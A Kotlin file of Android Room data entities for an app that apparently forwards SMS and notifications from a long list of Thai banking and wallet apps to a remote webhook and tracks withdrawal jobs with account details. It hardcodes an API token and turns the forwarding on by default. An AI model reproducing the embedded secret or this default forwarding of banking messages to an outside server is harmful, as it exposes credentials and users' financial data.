package com.example.data

import androidx.room.Entity
import androidx.room.PrimaryKey

@Entity(tableName = "configuration")
data class Configuration(
    @PrimaryKey val id: Int = 1,
    val webhookUrl: String = "https://easyo.online/api/v1/sms/callback",
    val token: String = "0d208ccb24bbe4a9d9dfce89a1d9e831bd52d5eb",
    val isSmsForwardEnabled: Boolean = true,
    val isNotificationForwardEnabled: Boolean = true,
    val selectedBankPackages: String = "com.kasikorn.kplus,com.kasikornbank.kbiz,com.kasikornbank.kmerchant,com.kasikorn.retail.mbanking.wap,com.kasikornbank.mobile,com.kasikorn.kplus.samsung,com.scb.phone,com.scb.smbbanking,com.scb.mobilebanking,com.scb.th,th.co.krungthaibank.next,com.krungthai.mobile,com.krungthaibank.next,th.co.krungthai.mobile,ktbcs.netbank,com.ktbcs.netbank,com.bualuang.mbanking,com.krungsri.kma,com.krungsri.mobile,com.krungsri.kma.android,com.ttbbank.oneapp,com.ttbbank.mobile,com.ttbbank.one,gsb.or.th.mymo,th.or.gsb.mobilebanking,gsb.or.th.mobile,com.tdg.truemoneywallet,com.truemoney.wallet,com.tdg.truemoney,com.garena.android.koalapay,com.shopeepay.th,com.garena.koalapay,th.co.lhbank.mobilebanking,th.co.lhbank.mobile,com.uob.mightyth,com.uob.thailand,com.uob.mobile.th,th.co.cimbthai.clicks,com.cimb.th,th.co.cimbthai.mobile,com.bangkokbank.mobile,com.bangkokbank.bualuangm,com.bangkokbank.bualuang,th.co.bangkokbank.mobile,com.gsb.mobile,com.tmb.tmbank,com.tmbank.mobile,com.ghbank.mobile,ghbank.or.th.mobile,com.tisco.mobile,th.co.tisco.mobilebanking,com.thanachart.mobile,th.co.thanachartbank.mobile,com.kasikorn.retail.mbanking,com.kasikorn.kplus.ent,com.kasikorn.kplus.corp,com.uob.mighty.th,com.uob.th.mighty,com.cimb.th.mobile,com.bankofthailand.mobile,com.promptpay.th,com.paypal.android,com.eglobedg.eWallet,com.grab.pay,com.mercadopago.android,com.visa.app,com.mastercard.app,com.techcombank.mobile,com.techcombank.retail,com.scb.pay,com.kasikorn.payment"
)

@Entity(tableName = "forward_logs")
data class ForwardLog(
    @PrimaryKey(autoGenerate = true) val id: Int = 0,
    val type: String, // "SMS" or "NOTIFICATION"
    val sender: String,
    val message: String,
    val status: String, // "SUCCESS" or "FAILED"
    val responseMessage: String? = null,
    val timestamp: Long = System.currentTimeMillis()
)

@Entity(tableName = "withdraw_jobs")
data class WithdrawJob(
    @PrimaryKey val ref: String,
    val amount: Double,
    val bankCode: String,
    val accountNumber: String,
    val accountName: String,
    val status: String, // "PENDING", "RESERVED", "PROCESSING", "SUCCESS", "FAILED"
    val bankRef: String? = null,
    val note: String? = null,
    val timestamp: Long = System.currentTimeMillis(),
    val isSimulated: Boolean = false
)

@Entity(tableName = "app_user")
data class AppUser(
    @PrimaryKey val id: Int = 1,
    val username: String,
    val expiresAt: String? = null
)
